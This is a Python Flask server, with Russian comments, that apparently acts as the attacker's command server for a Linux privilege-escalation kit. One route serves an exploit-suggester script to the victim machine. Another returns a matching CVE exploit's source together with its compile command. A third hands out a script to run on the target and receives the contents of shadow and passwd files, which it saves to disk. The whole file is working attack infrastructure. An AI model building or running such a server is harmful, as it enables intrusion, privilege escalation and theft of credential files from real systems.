import json
from flask import Flask, request, Response
from modules.res_parser import ResultParser

app = Flask(__name__, instance_relative_config=True)


@app.route('/')
def start():
    # выкидываем на машину чекер уязвимостей
    with open('shell_scripts/linux-exploit-suggester.sh', 'r', encoding='utf-8') as f:
        script = f.read()
    return script


@app.route('/data', methods=['POST'])
def router():
    """
    Метод для определения вариантов эскалации на основе данных от сборщика.
    Пока собирает эксплойты которые лежат в папке cve_repo.
    # TODO сделать загрузку из сурсов
    :return: Response
    """
    #  получаем запрос и конвертируем в модели, модели лежат в modules/models
    res = json.loads(request.data.decode('utf-8'))
    rp = ResultParser(res['result'])
    rp.convert_cve_to_model()
    # пока проверяем, что у нас есть модели с сурсом
    if rp.source_models:
        path = rp.source_models[0].source  # пока берем первую модель, сделать yield
        print(path)
        with open(rp.source_models[0].source, 'r', encoding='utf-8') as expl:
            # открываем файл эксплойта
            response_body = expl.read()
        with open(rp.source_models[0].source, 'r', encoding='utf-8') as expl_c:
            # Второе открытие файла нужно для вычитки команды компиляции
            command = expl_c.readlines()[0].replace('//', '').strip()
            print(command)
    # формируем ответ
    res = Response(response_body)  # добавляем тело
    res.headers.update({'command': f'{command}'})  # добавляем команду которой компилировать скрипт
    return res


@app.route('/health', methods=['GET', 'POST'])
def health():
    """
    Метод для работы core скрипта.
    На GET получаем py скрипт который будет выполняться на тачке
    На POST забираем данные от shadow/passwd
    :return:
    """
    if request.method == 'POST':
        with open('res.json', 'w', encoding='utf-8') as result_file:
            result_file.write(json.dumps(request.data.decode('utf-8')))
        return 'ok'
    with open('data.py', 'r', encoding='utf-8') as d:
        data_script = d.read()
    return data_script


app.run(host='0.0.0.0', port=1488, debug=True)
